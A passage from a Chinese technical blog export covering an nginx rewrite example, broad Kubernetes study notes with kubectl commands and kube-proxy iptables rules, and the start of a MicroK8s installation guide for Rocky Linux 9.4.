<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  www.peter.com;</span><br><span class="line">    access_log   access.log;</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line">    location / &#123;</span><br><span class="line">        default_type text/html;</span><br><span class="line">        return 200 &#x27;&lt;h1&gt;query_string: $query_string&lt;/h1&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~ /page/(\d+)$ &#123;</span><br><span class="line">        rewrite ^/page/(\d+)$ /page.php?id=$1 last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>这里的rewrite语句最后要指定last，不用break。因为在这个案例中, 我们需要重写后的URL(<code>http://peter.com/page/1</code>)继续从头开始匹配所有的location，命中<code>location /</code>规则。(如果指定break会返回404，可自行尝试)</li>
</ul>
<p>测试结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl localhost/page/1</span><br><span class="line">&lt;h1&gt;query_string: id=1&lt;/h1&gt;</span><br><span class="line"># curl localhost/page/234</span><br><span class="line">&lt;h1&gt;query_string: id=234&lt;/h1&gt;</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p>【1】<a href="https://blog.csdn.net/m0_62396418/article/details/135747521">Nginx rewrite地址重写</a><br>【2】<a href="https://developer.aliyun.com/article/1499869">Nginx-URLRewrite伪静态</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>kubernetes学习笔记</title>
    <url>/2024/1127213752.html</url>
    <content><![CDATA[<p>目标:</p>
<ul>
<li>k8s各资源对象及实践</li>
<li>运用k8s各项调度策略</li>
<li>掌握k8s网络原理及应用</li>
<li>掌握pod控制器及运用</li>
<li>掌握k8s微服务DevOps实践</li>
</ul>
<h1><span id="kubernetes简介">kubernetes简介</span></h1><p>Google开源的容器集群管理系统，主要功能:</p>
<ul>
<li>基于容器的应用部署、维护、滚动升级</li>
<li>负载均衡，服务发现</li>
<li>跨机器和跨地区的集群调度</li>
<li>自动伸缩</li>
<li>无状态服务和有状态服务</li>
<li>广泛的volume支持</li>
<li>插件机制保证扩展性</li>
</ul>
<h1><span id="创建第一个k8s-pod">创建第一个k8s Pod</span></h1><p><a href="https://blog.csdn.net/pcj_888/article/details/144200265">https://blog.csdn.net/pcj_888/article/details/144200265</a></p>
<h1><span id="创建k8s集群">创建k8s集群</span></h1><p><a href="https://blog.csdn.net/pcj_888/article/details/144240636">https://blog.csdn.net/pcj_888/article/details/144240636</a></p>
<h1><span id="kubernete核心组件">kubernete核心组件</span></h1><p>一个k8s集群由分布式存储etcd, 控制节点controller，和服务节点Node组成，k8s主要组件如下：</p>
<ul>
<li>etcd保存整个集群状态</li>
<li>apiserver提供资源操作唯一入口，提供认证、授权、访问控制、API注册和发现等机制</li>
<li>controller manager负责维护集群状态，如故障检测、自动扩展、滚动更新</li>
<li>kubelet负责维护容器生命周期，同时负责Volume和网络(CNI)管理</li>
<li>kube-proxy负责为Service提供cluster内部的服务发现和负载均衡</li>
</ul>
<p><img data-src="/k8s-architecture.png" alt="k8s-architecture.png"></p>
<p>插件Add-ons</p>
<ul>
<li>kube-dns负责为整个集群提供dns服务</li>
<li>ingress controller为服务提供外网入口</li>
<li>fluentd-elasticsearch提供集群日志采集、存储与查询</li>
<li>dashboard提供GUI</li>
</ul>
<h1><span id="组件通信">组件通信</span></h1><p><img data-src="/2024/1127213752/image1.png" alt="image1.png"></p>
<h1><span id="kubenetes基本概念">kubenetes基本概念</span></h1><h2><span id="pod">Pod</span></h2><p>Pod是一组紧密关联的容器， 是k8s调度的基本单位<br>Pod设计理念是支持多个容器在一个Pod中共享网络和文件系统，可通过进程间通信和文件共享的方式完成服务</p>
<h2><span id="node">Node</span></h2><p>Node是Pod真正运行的主机。为了管理Pod,每个Node上至少要运行container runtime、kubelet和kube-proxy</p>
<h2><span id="namespace">Namespace</span></h2><p>Namespace提供一种机制，将同一集群的资源划分为相互隔离的组<br>pod,service,deploymeny都是属于某一个namespace的，而node,persistentVolume不属于任何namespace</p>
<h2><span id="service">Service</span></h2><p>Service是应用服务的抽象，通过labels为应用提供负载均衡和服务发现。<br>匹配labels的Pod IP和端口列表组成endpoints, 由kube-proxy负责将服务IP负载均衡到这些endpoints上</p>
<h2><span id="声明式api">声明式API</span></h2><p>相对于命令式API, 声明式API对于重复操作的效果是稳定的，运行多次也不会出错</p>
<h2><span id="deployment">Deployment</span></h2><p>Deployment(部署)表示用户对k8s集群的一次更新操作。 可以是创建一个服务，更新一个服务，或者是滚动升级一个服务</p>
<h2><span id="service">Service</span></h2><p>Pod只是运行服务的实例，随时可能在一个节点停止，在另一个节点以新的IP启动，因此不能以确定IP和端口提供服务。<br>Service实现了服务发现和负载均衡的核心功能。</p>
<ul>
<li>每个Service对应一个集群内有效的虚拟IP，集群内部通过虚拟IP访问一个服务</li>
<li>k8s集群中微服务的负载均衡由kube-proxy实现。kube-proxy是一个分布式代理服务器，每个服务节点都有一个</li>
</ul>
<h2><span id="daemonset">DaemonSet</span></h2><p>业务Pod可能在有些节点运行多个Pod, 有些节点又没有Pod运行。而DaemonSet保证每个节点上都要有一个Pod运行。<br>典型的DaemonSet包括: 日志、监控(比如fluentd) </p>
<h2><span id="statefulset">StatefulSet</span></h2><p>StatefulSet是管理一组有状态pod的部署和扩展的控制器。</p>
<h2><span id="volume">Volume</span></h2><p>k8s的volume(存储卷)和Docker的类似。Docker的volume作用范围为一个容器，k8s的volume作用范围是一个Pod<br>每个Pod中声明的存储卷由Pod中所有容器共享</p>
<h2><span id="pvpersistent-volume和pvcpersistent-volume-claim">PV(Persistent Volume)和PVC(Persistent Volume Claim)</span></h2><p>PV和PVC的关系，和Node与Pod关系类似</p>
<h2><span id="secret">Secret</span></h2><p>Secret用于保存和传递密码、秘钥、认证凭证等敏感信息</p>
<h2><span id="环境变量">环境变量</span></h2><h2><span id="imagepullpolicy">ImagePullPolicy</span></h2><ul>
<li>Always: 不管镜像是否存在都拉取</li>
<li>Never: 不管镜像是否存在都不会进行拉取</li>
<li>IfNotPresent：默认值，只有镜像不存在时，才会进行镜像拉取</li>
</ul>
<p>注:</p>
<ul>
<li>默认为IfNotPresent, 但:latest标签镜像默认为Always</li>
<li>生产环境要避免使用:latest标签，开发环境可借助:latest自动拉取最新镜像</li>
</ul>
<h2><span id="访问dns的策略">访问DNS的策略</span></h2><p><a href="https://juejin.cn/post/6844903665879220231">https://juejin.cn/post/6844903665879220231</a><br>通过设置dnsPolicy参数，设置访问DNS的策略。默认为ClusterFirst</p>
<ul>
<li>ClusterFirst</li>
<li>ClusterFirstHostNet</li>
<li>Default</li>
<li>None</li>
</ul>
<p>** ClusterFirst**<br>默认值, 优先使用kubedns或coredns解析，如果不成功使用宿主机DNS解析<br>有一个冲突，如果Pod设置了HostNetwork&#x3D;true, ClusterFirst会强制转换为Default</p>
<p><strong>Default</strong><br>表示Pod里DNS配置和宿主机完全一致(&#x2F;etc&#x2F;resolv.conf完全一致)</p>
<p><strong>ClusterFirstWithHostNet</strong><br>Pod以host模式启动时，会使用宿主机的&#x2F;etc&#x2F;resolv.conf配置<br>如果Pod中仍然需要用k8s集群的DNS服务，需要将dnsPolicy设置为ClusterFirstWithHostNet</p>
<p><strong>None</strong><br>清除Pod预设的DNS配置。如果设置为None，为了避免Pod里没有任何DNS，需要添加dnsConfig描述自定义的DNS参数，例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spec:</span><br><span class="line">  dnsConfig:</span><br><span class="line">    nameservers:</span><br><span class="line">	  - 1.2.3.4</span><br><span class="line">	searches:</span><br><span class="line">	  - my.dns.search.suffix</span><br><span class="line">	options:</span><br><span class="line">	  - name: ndots</span><br><span class="line">	    value: &quot;2&quot;</span><br></pre></td></tr></table></figure>

<p><strong>使用主机的IPC命名空间</strong><br>设置hostIPC参数为True, 使用主机的IPC命名空间，默认为False</p>
<p><strong>使用主机的网络命名空间</strong><br>设置hostNetwork参数为True, 使用主机的网络命名空间，默认为False</p>
<p><strong>使用主机的PID空间</strong><br>设置hostPID参数为True, 使用主机的PID命名空间，默认为False</p>
<h1><span id="pod几种常见的状态">POD几种常见的状态</span></h1><ul>
<li>Pending 挂起</li>
<li>Running Pod所有容器已创建，且至少一个容器正处于运行状态、正在启动状态或重启状态</li>
<li>Succeeded Pod所有容器都执行成功后推出，并且没有处于重启的容器</li>
<li>Failed Pod至少一个容器推出为失败</li>
<li>Unknown kubelet故障，无法获得Pod状态</li>
</ul>
<h2><span id="pod重启策略restartpolicy">Pod重启策略(RestartPolicy)</span></h2><p>支持三种RestartPolicy</p>
<ul>
<li>Always 只要退出就重启 （默认)</li>
<li>OnFailure 失败退出(exit code不为0)才重启</li>
<li>Never 退出后不再重启</li>
</ul>
<h1><span id="健康检查三种探针">健康检查(三种探针)</span></h1><p><a href="https://juejin.cn/post/7163135179177852936">https://juejin.cn/post/7163135179177852936</a><br>为了探测容器状态，k8s提供了两种探针:</p>
<ul>
<li>LivenessProbe 存活性探针, 如果不正常就删除容器，再根据Pod重启策略作响应动作。</li>
<li>ReadinessProbe 就绪性探针，如果检测失败，将Pod的IP:Port从对应endpoint列表中删除。这种机制防止流量转发到不可用Pod上</li>
<li>StartupProbe 如果应用本身启动时间过长，LivenessProbe和ReadinessProbe可能会检测失败，导致容器不停地重启。 StartupProbe探针只是在容器启动后按照配置满足一次后，不在进行后续的探测。</li>
</ul>
<p>如果三个探针同时存在，先执行StartupProbe，禁用其他两个探针。直到满足StartupProbe，再启动其他两个探针。</p>
<h2><span id="livenessprobe和readinessprobe支持如下三种探测方法">LivenessProbe和ReadinessProbe支持如下三种探测方法</span></h2><ul>
<li>ExecAction 容器中指定的命令，退出码为0表示探测成功。</li>
<li>HTTPGetAction 通过HTTP GET请求容器，如果HTTP响应码【200，400)，认为容器健康。</li>
<li>TCPSocketAction 通过容器的IP地址和端口号执行TCP检查。如果建立TCP链接，则表明容器健康。</li>
</ul>
<p>可以给探针配置可选字段，用来更精确控制Liveness和Readiness两种探针行为</p>
<ul>
<li>initialDelaySeconds: 容器启动后等待多少秒后探针才开始工作，默认是0秒</li>
<li>periodSeconds: 执行探测的时间间隔，默认为10秒</li>
<li>timeoutSeconds: 探针执行检测请求后，等待响应的超时时间，默认为1秒</li>
<li>failureThreshold: 探测失败的重试次数，重试一定次数后认为失败。</li>
<li>successThreshold: 探针在失败后，被视为成功的最小连续成功数。默认值是 1。 存活和启动探测的这个值必须是 1。最小值是 1。</li>
</ul>
<h1><span id="容器生命周期钩子">容器生命周期钩子</span></h1><p>容器生命周期钩子(Container Lifecycle Hooks)监听容器生命周期的特定事件</p>
<ul>
<li>postStart 容器启动后执行，这里是异步执行，无法保证一定在ENTRYPOINT之后运行。 如果失败，容器会被删除，根据RestartPolicy决定是否重启</li>
<li>preStop 容器停止前执行，用于资源清理</li>
</ul>
<p>钩子函数回调支持两种方式</p>
<ul>
<li>exec 容器内执行命令</li>
<li>httpGet: 向指定URL发起GET请求</li>
</ul>
<h1><span id="使用能力机制capabilities">使用能力机制(Capabilities)</span></h1><p>例如：可以给容器增加CAP_NET_ADMIN，根据需要添加或删除网卡</p>
<h1><span id="k8s负载均衡有如下几种机制">K8s负载均衡有如下几种机制</span></h1><ul>
<li>service</li>
<li>ingress Controller</li>
<li>Service Load Balancer</li>
</ul>
<p>Service是对一组提供相同功能的Pods抽象，并为他们提供一个统一的入口。实现服务发现和负载均衡功能<br>Service有四种类型:</p>
<ul>
<li>ClusterIP 默认类型，自动分配一个仅cluster内部可以访问的虚拟IP</li>
<li>NodePort 在ClusterIP基础上，为Service在每台机器上绑定一个端口，这样就可以通过<nodeip>:NodePort来访问服务</nodeip></li>
<li>LoadBalancer</li>
<li>ExternalName</li>
</ul>
<h2><span id="service的定义">Service的定义</span></h2><p>Service通过yaml, 例如:定义一个nginx服务，将服务80端口转发到default namespace中带有标签run&#x3D;nginx的Pod的80端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx</span><br><span class="line">  namespace: default</span><br><span class="line">  labels:</span><br><span class="line">    run: nginx</span><br><span class="line">spec:</span><br><span class="line">  type: ClusterIP</span><br><span class="line">  selector:</span><br><span class="line">    run: nginx</span><br><span class="line">  ports:</span><br><span class="line">    - name: nginx</span><br><span class="line">      protocol: TCP</span><br><span class="line">      port: 80</span><br><span class="line">      targetPort: 80</span><br></pre></td></tr></table></figure>

<h1><span id="保留源ip">保留源IP</span></h1><p>各种类型的Service对源IP处理方法不同:</p>
<ul>
<li>clusterIP Service: 使用iptables模式</li>
<li>NodePort Service: 源IP会做SNAT</li>
</ul>
<h1><span id="ingress-controller">Ingress controller</span></h1><p>Service只支持4层负载均衡，没有7层功能。 Ingress可以解决这个问题</p>
<h1><span id="k8s存储卷">k8s存储卷</span></h1><p>容器数据是非持久化的，容器消亡后数据跟着丢失，所以Docker提供volume机制将数据持久化存储<br>类似的，k8s提供了更强大的Volume机制和丰富插件，解决了容器数据持久化和容器间共享数据的问题</p>
<p>与Docker不同，k8s volume生命周期与Pod绑定<br>Pod删除时。 volume才会清理，数据是否丢失取决于Volume类型。例如PV数据不会丢，emptyDir会丢失</p>
<h2><span id="persistent-volume">Persistent Volume</span></h2><p>PV提供网络存储资源，而PVC请求存储资源<br>Volume生命周期:</p>
<ul>
<li>Provisioning</li>
<li>Binding</li>
<li>Using</li>
<li>Releasing</li>
<li>Reclaiming<br>Volume状态:</li>
<li>Avaliable 可用</li>
<li>Bound 已分配给PVC</li>
<li>Released PVC解绑但未执行回收策略</li>
<li>Failed 发生错误</li>
</ul>
<h1><span id="deployment">Deployment</span></h1><p>为Pod提供了一个声明式定义的方法，应用场景方法:</p>
<ul>
<li>滚动升级和回滚应用</li>
<li>扩容和缩容</li>
<li>暂停和继续Deployment</li>
</ul>
<p>扩容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl scale deployment nginx-deployment --replicas 10</span><br></pre></td></tr></table></figure>
<p>回滚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl rollout undo deployment/nginx-deployment</span><br></pre></td></tr></table></figure>

<h2><span id="滚动更新rollout">滚动更新(rollout)</span></h2><p>只有Deployment的pod template中的label更新，或者镜像更改时被触发。<br>其他更新，例如扩容Deployment不会触发rollout.<br>滚动更新的示例: nginx:1.9.1代替nginx:1.7.9</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl set image deployment/nginx-deployment nginx=nginx=1.9.1</span><br><span class="line">Deployment &quot;nginx-deployment&quot; image updated</span><br></pre></td></tr></table></figure>
<p>查看rollout状态，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl rollout status deployment/nginx-deployment</span><br></pre></td></tr></table></figure>

<h2><span id="回滚deploymentrollback">回滚deployment(rollback)</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl rollout history deployment/nginx-deployment</span><br></pre></td></tr></table></figure>
<p>回退到历史版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl rollout undo deployment/nginx-deployment</span><br></pre></td></tr></table></figure>
<p>也可以使用–to-revision参数指定某个历史版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl rollout undo deployment/nginx-deployment --to-revision=2</span><br></pre></td></tr></table></figure>

<h2><span id="比例扩容">比例扩容</span></h2><h1><span id="secret">Secret</span></h1><p>举例: 创建tls的secret</p>
<h1><span id="statefulset">StatefulSet</span></h1><p>有状态服务</p>
<ul>
<li>稳定持久化存储，Pod重新调度后还是能访问到相同持久化数据</li>
<li>稳定网络标志, Pod重新调度后PodName和HostName不变</li>
<li>有序部署，有序扩展( 从0到N-1, 下一个Pod运行前，所有之前的Pod必须是Running和Ready状态)</li>
</ul>
<p>StatefulSet中每个Pod的DNS格式为<code>statefulSetName-&#123;0..N-1&#125;.serviceName.namespace.svc.cluster.local</code></p>
<h1><span id="daemonset">DaemonSet</span></h1><p>DaemonSet保证在每个Node上都运行一个容器副本，常用于部署一些集群的日志，监控，或者其他系统管理应用，典型应用包括:</p>
<ul>
<li>日志收集, 比如fluentd, logstash</li>
<li>系统监控, 比如Prometheus</li>
<li>系统程序, 比如kube-proxy, kube-dns, glusterd, ceph</li>
</ul>
<h1><span id="resource-quotas">Resource Quotas</span></h1><p>资源配额(Resource Quotas)是用来限制用户资源用量的一种机制<br>它的工作原理:</p>
<ul>
<li>资源配额应用在Namespace上, 并且每个Namespace最多只能有一个ResourceQuota对象</li>
<li>开启计算资源配额后，创建容器时必须配置计算资源请求或限制</li>
<li>用户超额后禁止创建新的资源</li>
</ul>
<h1><span id="资源配合类型">资源配合类型</span></h1><ul>
<li>计算资源, CPU和memory</li>
<li>存储资源, 包括存储资源总量以及指定storage class的总量</li>
<li>对象数, 即可创建的对象的个数<ul>
<li>pods, rc, configmaps, secrets</li>
<li>resourcequotas, persistentvolumeclaims</li>
<li>services, services.loadbalancers, services.nodeports</li>
</ul>
</li>
</ul>
<p>默认情况, k8s所有容器没有任何CPU和内存限制, LimitRange可以用来给Namespace增加一个资源限制，包括最小、最大、默认资源</p>
<h1><span id="pod隔离">Pod隔离</span></h1><p>使用标签选择器控制Pod之间流量<br>允许前端Pod访问后端Pod的XX端口, 允许后端Pod访问数据库的XX端口</p>
<h1><span id="ingress">ingress</span></h1><p>internet -&gt; ingress -&gt; services</p>
<h1><span id="configmap">configmap</span></h1><p>保存配置数据的键值对, 处理不包含敏感信息的字符串</p>
<p>三种使用方式:</p>
<ul>
<li>设置环境变量</li>
<li>设置容器命令行参数</li>
<li>在Volume中直接挂载文件或目录</li>
</ul>
<h1><span id="finalizer">Finalizer</span></h1><p>用于实现控制器的异步预测删除钩子，可以通过metadata.finalizers指定finalizer</p>
<h1><span id="etcd">etcd</span></h1><p>CoreOS基于Raft开发的分布式key-value存储</p>
<ul>
<li>基本的key-value存储</li>
<li>监听机制</li>
<li>key的过期和续约机制，用于监控和服务发现</li>
<li>原子CAS和CAD，用于分布式锁和leader选举</li>
</ul>
<h1><span id="api-server">API Server</span></h1><p>k8s最核心组件之一，提供如下功能:</p>
<ul>
<li>提供集群功能的REST API接口，包括认证，授权，准入控制，以及集群状态变更等</li>
<li>提供其他模块之间的数据交互和通信的枢纽</li>
</ul>
<p><img data-src="/2024/1127213752/apiserver.png" alt="apiserver.png"></p>
<h1><span id="kube-scheduler">kube-scheduler</span></h1><p>负责分配调度Pod到集群内的节点上，监听kube-apiserver，查询未分配Node的Pod，然后根据调度策略为Pod分配节点</p>
<p>指定Node节点调度</p>
<ul>
<li>nodeSelector 只调度到匹配指定label的Node上</li>
<li>nodeAffinity 功能更丰富的Node选择器，比如支持集合操作</li>
<li>podAffinity 调度到满足条件的Pod所在的Node上</li>
</ul>
<p>例如, 给Node打标签:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl label nodes node-01 disktype=ssd</span><br></pre></td></tr></table></figure>

<h1><span id="taints和tolerations">Taints和tolerations</span></h1><p>用于保证Pod不被调度到不合适的Node上，Taint应用于Node, toleration用于Pod上<br>例: 使用taint命令给node1添加taints</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl taint nodes node1 key1=value1:NoSchedule</span><br><span class="line">kubectl taint nodes node1 key1=value2:NoExecute</span><br></pre></td></tr></table></figure>

<p>目前支持的taint类型</p>
<ul>
<li>Noschedule 新的Pod不调度到该Node上, 不影响正在运行的Pod</li>
<li>PreferNoSchedule: soft版的NoSchedule，尽量不调度到该Node\</li>
<li>NoExecute: 新的Pod不调度到该Node上, 并且删除evict已在运行的Pod</li>
</ul>
<h1><span id="controller-manager">Controller manager</span></h1><p>通过apiserver监控整个集群状态，确保集群处于预期的工作状态</p>
<h1><span id="kubelet">kubelet</span></h1><p>每个节点上运行一个kubelet服务进程，默认监听10250端口，接受并执行主节点发来的指令，管理Pod和容器<br><img data-src="/2024/1127213752/kubelet.png" alt="kubelet.png"></p>
<h1><span id="容器运行时">容器运行时</span></h1><p><img data-src="/2024/1127213752/cri.png" alt="cri.png"></p>
<h1><span id="kube-proxy">kube-proxy</span></h1><p>监听API server中service和endpoint变化，通过iptables为服务配置负载均衡</p>
<p>iptables性能问题(服务多的时候,iptables规则可能上万，大规模会有性能问题)<br>还有ipvs的方案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A KUBE-MARK-DROP -j MARK --set-xmark 0x8000/0x8000</span><br><span class="line">-A KUBE-MARK-MASQ -j MARK --set-xmark 0x4000/0x4000</span><br><span class="line">-A KUBE-POSTROUTING -m comment --comment &quot;kubernetes service traffic</span><br><span class="line">requiring SNAT&quot; -m mark --mark 0x4000/0x4000 -j MASQUERADE</span><br><span class="line">-A KUBE-SEP-55QZ6T7MF3AHPOOB -s 10.244.1.6/32 -m comment --comment &quot;d</span><br><span class="line">efault/http:&quot; -j KUBE-MARK-MASQ</span><br><span class="line">-A KUBE-SEP-55QZ6T7MF3AHPOOB -p tcp -m comment --comment &quot;default/htt</span><br><span class="line">p:&quot; -m tcp -j DNAT --to-destination 10.244.1.6:80</span><br><span class="line">-A KUBE-SEP-KJZJRL2KRWMXNR3J -s 10.244.1.5/32 -m comment --comment &quot;d</span><br><span class="line">efault/http:&quot; -j KUBE-MARK-MASQ</span><br><span class="line">-A KUBE-SEP-KJZJRL2KRWMXNR3J -p tcp -m comment --comment &quot;default/htt</span><br><span class="line">p:&quot; -m tcp -j DNAT --to-destination 10.244.1.5:80</span><br><span class="line">-A KUBE-SERVICES -d 10.101.85.234/32 -p tcp -m comment --comment &quot;def</span><br><span class="line">ault/http: cluster IP&quot; -m tcp --dport 80 -j KUBE-SVC-7IMAZDGB2ONQNK4Z</span><br><span class="line">-A KUBE-SVC-7IMAZDGB2ONQNK4Z -m comment --comment &quot;default/http:&quot; -m</span><br><span class="line">statistic --mode random --probability 0.50000000000 -j KUBE-SEP-KJZJR</span><br><span class="line">L2KRWMXNR3J</span><br><span class="line">-A KUBE-SVC-7IMAZDGB2ONQNK4Z -m comment --comment &quot;default/http:&quot; -j</span><br><span class="line">KUBE-SEP-55QZ6T7MF3AHPOOB</span><br></pre></td></tr></table></figure>
<p>kube-proxy仅支持TCP和UDP</p>
<h1><span id="kube-dns">kube-dns</span></h1><p>为k8s集群提供命名服务, 一般通过Addon方式部署，从v1.3版本开始，成为一个内建的自启动服务<br>源码: <a href="https://github.com/kubernetes/dns">https://github.com/kubernetes/dns</a></p>
<h1><span id="kubectl命令行工具">kubectl命令行工具</span></h1><h1><span id="kubernetes网络">kubernetes网络</span></h1><ul>
<li>每个Pod都有一个独立的IP，Pod内所有容器共享一个网络命名空间</li>
<li>集群内所有Pod都在一个直接连通的扁平网络中，可通过IP直接访问</li>
<li>Service cluster IP可在集群内部访问，外部请求需要通过NodePort, LoadBalance或Ingress访问</li>
</ul>
<h1><span id="host-network">Host network</span></h1><p>最简单的网络模型就是让容器共享Host的network namespace，使用宿主机的网络协议栈。<br>优点:</p>
<ul>
<li>简单，无需任何额外配置</li>
<li>高校，没有NAT等额外开销<br>缺点:</li>
<li>没有任何的网络隔离</li>
<li>可能与Host的其他端口号冲突</li>
<li>容器内做网络配置，可能影响宿主机</li>
</ul>
<h1><span id="calico">Calico</span></h1><p>一个基于BGP的纯三层的数据中心网络方案(不需要Overlay)<br>Calico在每一个计算节点利用Linux Kernel实现一个高校的vRouter来负责数据转发，<br>每个vRouter通过BGP协议负责把自己运行workload路由信息像整个Calico网络内传播</p>
<h1><span id="cni-container-network-interface">CNI (Container Network Interface)</span></h1><p>基本思想： Container Runtime在创建容器时，先创建好network namespace，然后调用CNI插件为这个netns配置网络，其后再启动容器内的进程</p>
<h2><span id="bridge">bridge</span></h2><h2><span id="ipvlan">IPVLAN</span></h2><p>从一个主机接口虚拟出多个虚拟网络接口, 所有接口有相同的MAC地址，不同的IP地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip link add link &lt;master-dev&gt; &lt;slave-dev&gt; type ipvlan mode &#123; L2 | L3 &#125;</span><br></pre></td></tr></table></figure>

<h2><span id="macvlan">MACVLAN</span></h2><p>MACVLAN可以从一个主机接口虚拟出多个macvtap，且每个macvtap设备都有不同的mac地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip link add link &lt;master-dev&gt; name macvtap0 type macvtap</span><br></pre></td></tr></table></figure>

<p>面试题:</p>
<ul>
<li>简述k8s, Docker, minikube</li>
<li>简述k8s常见部署方式</li>
<li>简述k8s集群管理</li>
<li>简述k8s优势</li>
<li>简述k8s相关概念 Master,Node,Pod,Label,Deployment,Service,Volume,Namespace</li>
<li>简述k8s集群相关组件 kube-proxy iptables,ipvs原理</li>
<li>简述k8s创建一个Pod流程</li>
<li>简述k8s中Pod的重启策略</li>
<li>简述k8s中Pod的健康检查方式 <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/</a></li>
<li>简述k8s中Pod的常见调度方式</li>
<li>简述k8s Pod生命周期</li>
<li>删除一个Pod过程</li>
<li>简述k8s deployment升级流程,和升级策略</li>
<li>简述DaemonSet</li>
<li>简述k8s自动扩容机制</li>
<li>什么是k8s的service，解决什么问题</li>
<li>简述k8s Service类型(ClusterIP, NodePort, LoadBalancer)</li>
<li>简述k8s service分发后端策略(RoundRobin,SessionAffinity)</li>
<li>如何从k8s外部访问集群内服务?</li>
<li>简述Ingress机制</li>
<li>k8s镜像下载策略</li>
<li>简述k8s各模块如何与APIServer通信</li>
<li>k8s scheduler</li>
<li>k8s kubelet</li>
<li>k8s哪些机制保持安全性</li>
<li>k8s secret作用(私密数据, Tokens, SSH keys)</li>
<li>k8s 网络模型?</li>
<li>k8s calico原理?</li>
<li>k8s 数据持久化方式?</li>
<li>k8s PV和PVC, PV生命周期</li>
<li>k8s worker系欸但加入集群过程</li>
<li>容器和主机部署应用的区别</li>
<li>k8s 标签和标签选择器有什么用?</li>
<li>etcd特点和应用场景</li>
</ul>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在RockyLinux9.4上安装Microk8s</title>
    <url>/2024/1201142626.html</url>
    <content><![CDATA[<h2><span id="在线安装microk8s">在线安装Microk8s</span></h2><p>1、安装snap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y epel-release</span><br><span class="line">yum install -y snapd</span><br><span class="line">systemctl enable --now snapd.socket</span><br><span class="line">systemctl start snapd</span><br><span class="line">ln -s /var/lib/snapd/snap /snap</span><br></pre></td></tr></table></figure>

<p>2、安装microk8s</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap install microk8s --classic <span class="comment"># 在RockyLinux9.4上, 默认下载Microk8s 1.31版本</span></span><br><span class="line">snap install microk8s --classic --channel=1.31/stable <span class="comment"># --channnel参数可以指定Microk8s的版本</span></span><br><span class="line">snap <span class="built_in">alias</span> microk8s.kubectl kubectl</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>3、安装microk8s插件(addons)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s <span class="built_in">enable</span> dns ingress metrics-server</span><br></pre></td></tr></table></figure>

<p>成功安装后，通过kubectl查看Pod和Image</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubectl get pods -A</span></span><br><span class="line">kube-system   calico-node-srvfr                         1/1     Running   0          11m</span><br><span class="line">kube-system   calico-kube-controllers-5b577d865-xwqjh   1/1     Running   0          11m</span><br><span class="line">kube-system   coredns-64c6478b6c-fcvkk                  1/1     Running   0          23s</span><br><span class="line">ingress       nginx-ingress-microk8s-controller-rqtj2   1/1     Running   0          32s</span><br><span class="line">kube-system   metrics-server-679c5f986d-vb6z7           1/1     Running   0          53m</span><br><span class="line"></span><br><span class="line">microk8s.ctr i list | grep -vw DIGEST | grep -v ^sha256 | grep -v @sha256 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">coredns/coredns:1.10.1</span><br><span class="line">docker.io/calico/cni:v3.25.1</span><br><span class="line">docker.io/calico/kube-controllers:v3.25.1</span><br><span class="line">docker.io/calico/node:v3.25.1</span><br><span class="line">docker.io/coredns/coredns:1.10.1</span><br><span class="line">registry.k8s.io/ingress-nginx/controller:v1.11.2</span><br><span class="line">registry.k8s.io/metrics-server/metrics-server:v0.6.3</span><br><span class="line">registry.k8s.io/pause:3.7</span><br></pre></td></tr></table></figure>

<h2><span id="在线安装可能遇到的问题">在线安装可能遇到的问题</span></h2><p><strong>问题1:</strong> pod启动失败, 通过<code>kubectl -n kube-system describe pod</code> 查到失败原因是下载镜像失败<br>解决方法: 使用microk8s.ctr从国内源下载镜像，再给镜像打个tag，需要下载的镜像如下：</p>
